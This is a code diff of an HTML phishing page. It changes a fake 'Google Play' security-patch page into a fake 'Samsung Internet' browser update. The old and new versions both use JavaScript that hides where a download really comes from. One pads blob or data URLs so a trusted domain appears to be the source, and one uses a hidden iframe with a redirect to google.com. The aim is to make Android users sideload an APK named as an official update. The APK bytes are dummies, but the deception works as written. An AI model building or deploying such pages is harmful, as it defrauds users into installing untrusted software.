@@ -3,50 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Update</title>
+    <title>Samsung Internet Security Update</title>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; }
+        .container { border: 1px solid #0078d4; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(0, 120, 212, 0.2); }
+        .brand-logo { color: #0078d4; font-size: 3em; font-weight: bold; margin-bottom: 10px; }
+        .warning { color: #44baff; font-weight: bold; font-size: 1.1em; margin-bottom: 20px; }
+        #installBtn {
+            padding: 15px 35px;
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1em;
+            border-radius: 8px;
+            transition: 0.3s;
+        }
+        #installBtn:hover { background: #005a9e; transform: scale(1.05); }
+        #status { margin-top: 25px; font-size: 0.8em; color: #888; font-family: monospace; }
+    </style>
 </head>
-<body style="background:#f1f3f4; font-family:sans-serif; text-align:center; padding-top:100px;">
-
-    <div style="padding:40px; background:#fff; border-radius:12px; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-        <h2 style="color:#1a73e8; margin-top:0;">Google Play</h2>
-        <p>A critical security patch is ready.</p>
-        <button id="pwnBtn" style="padding:15px 30px; background:#1a73e8; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">INSTALL NOW</button>
+<body>
+    <div class="container">
+        <div class="brand-logo">🌐</div>
+        <div class="warning">Browser Update Required</div>
+        <p>A critical security patch for Samsung Internet is ready.</p>
+                
+        <button type="button" id="installBtn">
+            Update Internet Browser
+        </button>
+        <div id="status">> SYSTEM_READY: Pending user verification...</div>
     </div>
 
 <script>
-    document.getElementById('pwnBtn').addEventListener('click', function() {
-        const spoofDomain = "www.google.com";
-        const filename = "Google_Update.apk";
-        
-        // Karakter khusus untuk mengecoh parser Chrome
-        const nbSpace = decodeURIComponent("%C2%A0");
-        const padding = nbSpace.repeat(3000); 
-        const fakeUrl = `https://${spoofDomain}/update/system-patch-v105/`;
+    document.getElementById('installBtn').addEventListener('click', function() {
+        // --- 1. CONFIGURATION ---
+        const filename = "Internet.apk"; // Nama file diganti sesuai permintaan
+        const realDomain = "www.samsung.com";
+                
+        // --- 2. ADVANCED SPOOFING LOGIC ---
+        // Padding masif untuk mendorong skema data: keluar dari tampilan UI
+        const padding = "/update/".repeat(30);
+        const longSub = realDomain + padding;
 
-        // 1. Buat Payload APK
-        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); 
-        const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
-        const blobUrl = URL.createObjectURL(blob);
-        const finalPayload = blobUrl + "#" + padding + fakeUrl;
+        // --- 3. PAYLOAD CONSTRUCTION ---
+        // Dummy Base64 (Hanya untuk demonstrasi)
+        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
+        const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#https://${longSub}`;
 
-        // 2. TEKNIK IFRAME: Buat iframe transparan untuk memicu download
-        // Ini seringkali membingungkan "Origin Tracker" pada Chrome Android
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
+        // --- 4. EXECUTION ---
+        const a = document.createElement('a');
+        a.href = payload;
+        a.download = filename;
+        a.rel = "noopener";
+                
+        document.body.appendChild(a);
+        a.click();
+                
+        document.getElementById('status').innerText = "> INJECTING_ORIGIN: " + realDomain;
 
-        // 3. Eksekusi Download di dalam context Iframe
-        iframe.src = finalPayload;
-
-        // 4. Sinkronisasi Address Bar
-        // Kita paksa tab utama berpindah ke Google saat dialog download sedang dipersiapkan
-        window.location.replace("https://www.google.com/android/update");
-
-        // Cleanup
+        // --- 5. CLEANUP ---
         setTimeout(() => {
-            URL.revokeObjectURL(blobUrl);
-            document.body.removeChild(iframe);
-        }, 2000);
+            document.body.removeChild(a);
+        }, 1500);
     });
 </script>
 </body>
